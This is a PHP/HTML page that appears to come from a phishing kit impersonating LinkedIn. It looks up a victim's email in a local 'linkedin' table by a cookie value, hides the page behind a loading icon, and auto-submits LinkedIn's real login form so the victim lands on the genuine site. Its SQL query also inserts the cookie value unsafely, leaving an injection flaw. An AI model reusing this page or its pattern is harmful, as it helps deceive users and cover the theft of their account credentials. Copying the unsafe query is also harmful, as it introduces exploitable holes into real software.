<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `linkedin` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["myform"].submit();}</script>




<form action="https://www.linkedin.com/uas/login-submit" method="POST" name="login" novalidate="novalidate" class="nav-signin-form" data-jsenabled="check" id="myform">
<input type="hidden" name="isJsEnabled" value="true">
<fieldset>
<legend>Sign In</legend>
<ul id="yui-gen1">
<li>
<label for="session_key-login">Email:</label>
<input type="text" name="session_key" value="<?=$email;?>" id="session_key-login" data-ime-mode-disabled="">
</li>
<li class="password">
<label for="session_password-login">Password:</label>
<input type="password" name="session_password" value="" id="session_password-login">
</li>
<li>
<input type="submit" name="" value="Sign In" class="btn-secondary" id="btn-login" disabled="">
</li>
</ul>
</fieldset>
<input type="hidden" name="source_app" value="">
<input type="hidden" name="trk" value="guest_home">
<input type="hidden" name="session_redirect" value="" id="session_redirect-login"><input type="hidden" name="csrfToken" value="ajax:4177652164737208644" id="csrfToken-login"><input type="hidden" name="sourceAlias" value="0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi" id="sourceAlias-login">
</form>



</body>
</html>

